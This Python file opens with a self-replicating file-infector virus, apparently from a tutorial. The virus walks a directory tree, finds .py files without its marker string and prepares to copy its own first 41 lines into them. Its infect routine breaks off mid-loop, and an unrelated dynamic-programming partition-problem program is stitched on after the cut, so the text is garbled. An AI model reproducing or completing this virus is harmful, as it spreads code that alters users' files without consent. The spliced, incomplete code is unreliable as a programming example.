#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# A Dynamic Programming based
# Python3 program to partition problem
 
# Returns true if arr[] can be partitioned
# in two subsets of equal sum, otherwise false
def findPartiion(arr, n) :
    Sum = 0
 
    # Calculate sum of all elements
    for i in range(n) :
        Sum += arr[i]
    if (Sum % 2 != 0) :
        return 0
    part = [0] * ((Sum // 2) + 1)
 
    # Initialize the part array as 0
    for i in range((Sum // 2) + 1) :
        part[i] = 0
 
    # Fill the partition table in bottom up manner
    for i in range(n) :
       
        # the element to be included
        # in the sum cannot be
        # greater than the sum
        for j in range(Sum // 2, arr[i] - 1, -1) :
           
            # check if sum - arr[i]
            # could be formed
            # from a subset
            # using elements
            # before index i
            if (part[j - arr[i]] == 1 or j == arr[i]) :
                part[j] = 1
 
    return part[Sum // 2]
 
# Drive code 
arr = [ 1, 3, 3, 2, 3, 2 ]
n = len(arr)
 
# Function call
if (findPartiion(arr, n) == 1) :
    print("Can be divided into two subsets of equal sum")
else :
    print("Can not be divided into two subsets of equal sum")
 
    # This code is contributed by divyeshrabadiya07
# Time Complexity: O(sum*n)
# Space Complexity: O(sum)